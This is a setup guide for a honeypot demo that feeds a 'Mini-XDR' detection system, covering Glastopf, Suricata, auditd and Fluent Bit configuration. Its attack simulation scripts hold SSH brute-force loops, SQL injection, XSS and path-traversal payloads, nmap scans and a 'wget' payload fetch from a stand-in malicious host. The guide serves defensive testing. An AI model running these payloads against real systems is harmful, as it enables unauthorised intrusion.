# 🍯 Complete Honeypot Demo Setup for Mini-XDR
**Full System Capabilities Demonstration Guide**

## 🎯 Current System Analysis

After analyzing all agents, ML models, and integrations, here's what we need to set up on your honeypot VM to showcase the **complete Mini-XDR system capabilities**:

### ✅ Currently Working (Already Set Up)
- **Cowrie SSH Honeypot** - SSH/Telnet honeypot with JSON logging
- **Fluent Bit** - Log forwarding to Mini-XDR
- **SSH Key Access** - For remote containment actions

### 🚀 Additional Components Needed (Critical for Full Demo)

---

## 📊 **Phase 1: Multi-Protocol Honeypots** (High Impact)

### 1. **Glastopf Web Honeypot** 
**Purpose**: Simulate vulnerable web applications to trigger web-based attacks
```bash
# Install Glastopf
sudo apt update
sudo apt install -y python3-dev python3-setuptools libevent-dev libmysqlclient-dev libxml2-dev libxslt-dev zlib1g-dev

# Clone and setup
cd /opt
sudo git clone https://github.com/mushorg/glastopf.git
cd glastopf
sudo python3 -m venv venv
sudo venv/bin/pip install -r requirements.txt
sudo venv/bin/pip install .

# Create configuration
sudo mkdir -p /opt/glastopf/log
sudo tee /opt/glastopf/glastopf.cfg << 'EOF'
[webserver]
host = 0.0.0.0
port = 80
uid = nobody
gid = nogroup

[logging]
log_json = /opt/glastopf/log/glastopf.json
log_hpfeeds = false

[database]
enabled = True

[dork_db]
enabled = True
pattern = rfi
EOF

# Create systemd service
sudo tee /etc/systemd/system/glastopf.service << 'EOF'
[Unit]
Description=Glastopf Web Honeypot
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/glastopf
ExecStart=/opt/glastopf/venv/bin/glastopf --config /opt/glastopf/glastopf.cfg
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable glastopf
sudo systemctl start glastopf
sudo ufw allow 80
```

### 2. **Suricata Network IDS**
**Purpose**: Detect network-level attacks and reconnaissance
```bash
# Install Suricata
sudo apt install -y suricata

# Configure for JSON logging
sudo tee /etc/suricata/suricata.yaml << 'EOF'
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: /var/log/suricata/eve.json
      pcap-file: false
      community-id: false
      community-id-seed: 0
      types:
        - alert:
            tagged-packets: yes
        - http:
            extended: yes
        - dns:
            query: yes
            answer: yes
        - tls:
            extended: yes
        - files:
            force-magic: no
        - smtp:
        - ssh
        - stats:
            totals: yes
            threads: no
            deltas: no
        - flow

# Basic detection rules
rule-files:
  - suricata.rules
  - /var/lib/suricata/rules/*.rules

# Network interfaces
af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow

logging:
  default-log-level: notice
  outputs:
  - console:
      enabled: yes
  - file:
      enabled: yes
      level: info
      filename: /var/log/suricata/suricata.log
EOF

# Update rules
sudo suricata-update

# Start Suricata
sudo systemctl enable suricata
sudo systemctl start suricata
```

### 3. **System Auditing (auditd)**
**Purpose**: Log system calls and security events
```bash
# Install auditd
sudo apt install -y auditd audispd-plugins

# Configure audit rules
sudo tee /etc/audit/rules.d/honeypot.rules << 'EOF'
# File access monitoring
-w /etc/passwd -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k identity

# System calls
-a always,exit -F arch=b64 -S execve -k commands
-a always,exit -F arch=b32 -S execve -k commands

# Network connections
-a always,exit -F arch=b64 -S connect -k network
-a always,exit -F arch=b32 -S connect -k network

# File modifications
-w /bin -p wa -k binaries
-w /sbin -p wa -k binaries
-w /usr/bin -p wa -k binaries
-w /usr/sbin -p wa -k binaries

# SSH activity
-w /var/log/auth.log -p wa -k ssh
-w /home/cowrie -p wa -k cowrie
EOF

# Restart auditd
sudo systemctl restart auditd

# Create JSON converter script
sudo tee /opt/audit-to-json.sh << 'EOF'
#!/bin/bash
# Convert audit logs to JSON format for ingestion
ausearch -i --start today | grep -v "^----" | while IFS= read -r line; do
    if [[ -n "$line" ]]; then
        echo "{\"timestamp\": \"$(date -Iseconds)\", \"audit_event\": \"$line\"}" >> /var/log/audit/audit.json
    fi
done
EOF

sudo chmod +x /opt/audit-to-json.sh

# Create cron job for regular conversion
echo "*/5 * * * * root /opt/audit-to-json.sh" | sudo tee -a /etc/crontab
```

---

## 🤖 **Phase 2: Enhanced Fluent Bit Configuration** (Critical Integration)

### Multi-Source Log Forwarding
```bash
# Update Fluent Bit configuration for all sources
sudo tee /etc/fluent-bit/fluent-bit.conf << 'EOF'
[SERVICE]
    Flush        1
    Log_Level    info
    Daemon       off
    HTTP_Server  On
    HTTP_Listen  0.0.0.0
    HTTP_Port    2020

# Cowrie SSH honeypot logs
[INPUT]
    Name              tail
    Path              /home/cowrie/cowrie/var/log/cowrie/cowrie.json*
    Parser            json
    Tag               cowrie
    Refresh_Interval  1
    Read_from_Head    false

# Glastopf web honeypot logs  
[INPUT]
    Name              tail
    Path              /opt/glastopf/log/glastopf.json*
    Parser            json
    Tag               glastopf
    Refresh_Interval  1
    Read_from_Head    false

# Suricata IDS logs
[INPUT]
    Name              tail
    Path              /var/log/suricata/eve.json*
    Parser            json
    Tag               suricata
    Refresh_Interval  1
    Read_from_Head    false

# Audit logs (converted to JSON)
[INPUT]
    Name              tail
    Path              /var/log/audit/audit.json*
    Parser            json
    Tag               auditd
    Refresh_Interval  5
    Read_from_Head    false

# Add hostname filter
[FILTER]
    Name modify
    Match *
    Add host honeypot-vm

# Forward to Mini-XDR
[OUTPUT]
    Name  http
    Match *
    Host  10.0.0.123
    Port  8000
    URI   /ingest/multi
    Format json
    Header Authorization Bearer honeypot-agent-key-12345
    Header Content-Type application/json
    Retry_Limit 5
EOF

# Restart Fluent Bit
sudo systemctl restart fluent-bit-xdr
```

---

## 🔥 **Phase 3: Attack Simulation Tools** (Demo Enhancement)

### 1. **Automated Attack Generators**
```bash
# Create attack simulation scripts
sudo mkdir -p /opt/attack-sim

# SSH Brute Force Simulator
sudo tee /opt/attack-sim/ssh-brute.sh << 'EOF'
#!/bin/bash
# Simulate SSH brute force attacks
TARGET=${1:-localhost}
for i in {1..20}; do
    sshpass -p "password$i" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no admin@$TARGET -p 2222 "echo test" 2>/dev/null
    sleep 1
done
EOF

# Web Attack Simulator
sudo tee /opt/attack-sim/web-attacks.sh << 'EOF'
#!/bin/bash
# Simulate web attacks against Glastopf
TARGET=${1:-localhost}

# Common web attack vectors
curl -s http://$TARGET/admin.php
curl -s http://$TARGET/wp-admin/
curl -s http://$TARGET/phpmyadmin/
curl -s "http://$TARGET/index.php?id=1' OR 1=1--"
curl -s "http://$TARGET/search.php?q=<script>alert('xss')</script>"
curl -s "http://$TARGET/file.php?path=../../../etc/passwd"
curl -s -d "username=admin&password=password" http://$TARGET/login.php
curl -s -A "sqlmap/1.0" http://$TARGET/
curl -s -A "Nikto/2.1.6" http://$TARGET/
EOF

# Network Reconnaissance Simulator  
sudo tee /opt/attack-sim/recon.sh << 'EOF'
#!/bin/bash
# Simulate network reconnaissance
TARGET=${1:-10.0.0.23}

# Port scanning patterns that Suricata will detect
nmap -sS -O $TARGET 2>/dev/null
nmap -sV -p 1-1000 $TARGET 2>/dev/null
nmap -sU -p 53,161,123 $TARGET 2>/dev/null
EOF

sudo chmod +x /opt/attack-sim/*.sh
```

### 2. **Malware Samples** (Safe for Testing)
```bash
# Create fake malware samples for testing
sudo mkdir -p /tmp/malware-samples

# EICAR test string (harmless test file)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/malware-samples/eicar.txt

# Fake ransomware note
cat > /tmp/malware-samples/README_DECRYPT.txt << 'EOF'
Your files have been encrypted!
To decrypt your files, send 1 BTC to: 1FakeAddress123...
This is a test file for honeypot demonstration.
EOF

# Fake cryptocurrency miner script
cat > /tmp/malware-samples/miner.sh << 'EOF'
#!/bin/bash
# Fake cryptocurrency miner for testing
echo "Starting mining process..."
echo "Connecting to mining pool: stratum+tcp://fake-pool.com:4444"
echo "Worker: honeypot.001"
while true; do
    echo "Hash rate: $(shuf -i 100-1000 -n 1) MH/s"
    sleep 5
done
EOF

chmod +x /tmp/malware-samples/miner.sh
```

---

## 🧪 **Phase 4: Testing & Validation Scripts**

### 1. **Comprehensive Attack Test**
```bash
sudo tee /opt/full-attack-test.sh << 'EOF'
#!/bin/bash
# Comprehensive attack simulation for Mini-XDR testing
TARGET=${1:-10.0.0.23}

echo "🚀 Starting comprehensive attack simulation against $TARGET"

echo "📡 Phase 1: Network Reconnaissance"
nmap -sS -p 22,80,443 $TARGET

echo "🔐 Phase 2: SSH Brute Force"
for pass in password admin 123456 root; do
    sshpass -p "$pass" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no admin@$TARGET -p 2222 "whoami" 2>/dev/null
    sleep 2
done

echo "🌐 Phase 3: Web Application Attacks"
curl -s "http://$TARGET/admin.php" 
curl -s "http://$TARGET/wp-admin/admin.php"
curl -s "http://$TARGET/index.php?id=1' OR 1=1--"
curl -s "http://$TARGET/search.php?q=<script>alert('xss')</script>"

echo "💾 Phase 4: File Download Simulation"
# This would trigger Cowrie file download events
echo "wget http://malicious-site.com/payload.sh" | sshpass -p "admin" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no root@$TARGET -p 2222

echo "🎯 Attack simulation complete. Check Mini-XDR dashboard for detections."
EOF

sudo chmod +x /opt/full-attack-test.sh
```

### 2. **Health Check Script**
```bash
sudo tee /opt/honeypot-status.sh << 'EOF'
#!/bin/bash
# Honeypot system health check

echo "🍯 Honeypot System Status Check"
echo "================================"

# Check services
echo "📊 Service Status:"
for service in cowrie glastopf suricata auditd fluent-bit-xdr; do
    if systemctl is-active --quiet $service; then
        echo "  ✅ $service: Running"
    else
        echo "  ❌ $service: Stopped"
    fi
done

echo
echo "📁 Log File Status:"
echo "  Cowrie: $(find /home/cowrie/cowrie/var/log/cowrie/ -name "*.json" -mmin -5 | wc -l) recent files"
echo "  Glastopf: $(find /opt/glastopf/log/ -name "*.json" -mmin -5 | wc -l) recent files"  
echo "  Suricata: $(find /var/log/suricata/ -name "eve.json" -mmin -5 | wc -l) recent files"
echo "  Audit: $(find /var/log/audit/ -name "*.json" -mmin -5 | wc -l) recent files"

echo
echo "🌐 Network Status:"
netstat -tlnp | grep -E "(2222|80|22022)"

echo
echo "💾 Disk Usage:"
df -h | grep -E "(/$|/var|/opt|/home)"

echo
echo "📈 Recent Activity (last 5 minutes):"
echo "  Cowrie events: $(find /home/cowrie/cowrie/var/log/cowrie/ -name "*.json" -exec grep -c "$(date -d '5 minutes ago' '+%Y-%m-%d %H:%M')" {} \; 2>/dev/null | paste -sd+ | bc)"
echo "  Web requests: $(journalctl -u glastopf --since="5 minutes ago" | grep -c "GET\|POST" || echo "0")"
echo "  Suricata alerts: $(tail -n 100 /var/log/suricata/eve.json 2>/dev/null | grep -c "alert" || echo "0")"
EOF

sudo chmod +x /opt/honeypot-status.sh
```

---

## 🔧 **Phase 5: API Keys & Integration Setup**

### External Threat Intelligence
```bash
# In your Mini-XDR backend/.env file, ensure these are set:
ABUSEIPDB_API_KEY=CONFIGURE_IN_AWS_SECRETS_MANAGER
VIRUSTOTAL_API_KEY=your-virustotal-key-here
OPENAI_API_KEY=your-openai-key-here
```

### Docker Integration (Optional)
```bash
# Install Docker for deception agent honeypot management
sudo apt install -y docker.io
sudo systemctl enable docker
sudo usermod -a -G docker xdrops

# Pull honeypot images that the deception agent can deploy
sudo docker pull cowrie/cowrie:latest
sudo docker pull honeynet/conpot:latest
sudo docker pull nginx:alpine
```

---

## 🎯 **Complete Demonstration Workflow**

### Step 1: Verify All Components
```bash
# On honeypot VM
sudo /opt/honeypot-status.sh

# On Mini-XDR host  
curl http://localhost:8000/health
curl http://localhost:8000/incidents
```

### Step 2: Run Multi-Phase Attack Simulation
```bash
# From Kali/attacker machine
/opt/full-attack-test.sh 10.0.0.23
```

### Step 3: Monitor XDR Response
```bash
# Watch real-time detection
curl http://localhost:8000/incidents | jq .

# Check AI agent analysis
curl -X POST http://localhost:8000/api/agents/orchestrate \
  -H "Content-Type: application/json" \
  -d '{"query": "Analyze recent attacks and provide containment recommendations"}'

# Verify ML model scoring
curl http://localhost:8000/api/ml/status
```

### Step 4: Test Automated Response
```bash
# Verify containment actions
ssh -i ~/.ssh/xdrops_id_ed25519 -p 22022 xdrops@10.0.0.23 'sudo ufw status numbered'

# Should show blocked IPs from automated containment
```

---

## 📊 **Expected Demo Outcomes**

### Real-Time Multi-Source Detection
- **SSH attacks** detected by Cowrie → AI analysis → containment
- **Web attacks** detected by Glastopf → threat intelligence lookup → risk scoring  
- **Network scans** detected by Suricata → ML anomaly scoring → incident creation
- **System events** captured by auditd → forensic analysis → evidence collection

### AI-Powered Analysis
- **Multi-agent reasoning** combining SSH, web, and network indicators
- **ML ensemble scoring** using Isolation Forest + LSTM models
- **Threat intelligence enrichment** via AbuseIPDB/VirusTotal APIs
- **Natural language explanations** of attack patterns and containment decisions

### Automated Response
- **Dynamic containment** via SSH-controlled UFW rules
- **Adaptive honeypot deployment** based on attack patterns
- **Forensic evidence collection** with chain of custody
- **SOAR playbook execution** for complex incident workflows

---

## 🚀 **Quick Start Commands**

```bash
# 1. Set up all honeypot components (run on honeypot VM)
sudo apt update && sudo apt install -y git python3-venv
curl -fsSL https://get.docker.com | sudo sh
sudo bash /path/to/complete-honeypot-setup.sh

# 2. Configure Mini-XDR integration (run on XDR host)
./scripts/start-all.sh

# 3. Run attack simulation (run from attacker machine)  
sudo /opt/full-attack-test.sh 10.0.0.23

# 4. Monitor results (XDR host)
curl http://localhost:8000/incidents | jq .
open http://localhost:3000/agents
```

This comprehensive setup will demonstrate the **full capabilities** of your Enhanced Mini-XDR system with real multi-protocol attack detection, AI-powered analysis, ML-based scoring, and automated response capabilities!
